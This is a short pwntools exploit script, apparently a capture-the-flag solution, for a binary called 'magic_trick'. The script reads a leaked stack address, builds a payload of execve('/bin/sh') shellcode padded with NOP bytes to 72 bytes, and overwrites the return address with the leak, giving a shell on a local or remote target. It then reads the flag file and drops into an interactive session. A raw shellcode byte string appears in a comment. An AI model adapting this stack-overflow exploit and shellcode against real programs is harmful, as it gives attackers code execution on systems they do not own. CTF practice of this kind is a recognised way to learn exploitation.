from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./magic_trick"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
# shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode =asm(shellcraft.execve("/bin/sh"))
io = start()

padding = 72

io.recvuntil(b"is '")
leak = int(io.recvuntil(b"'")[:-1], 16)
info("leak: %#x", leak)
io.sendlineafter(b">>", b"y")

payload = shellcode.ljust(padding, b'\x90') + p64(leak)

io.sendlineafter('>> ', payload)
pause(1)
io.sendline(b"cat flag.txt")
flag = io.recvline()
info("flag: %s", flag)
io.interactive()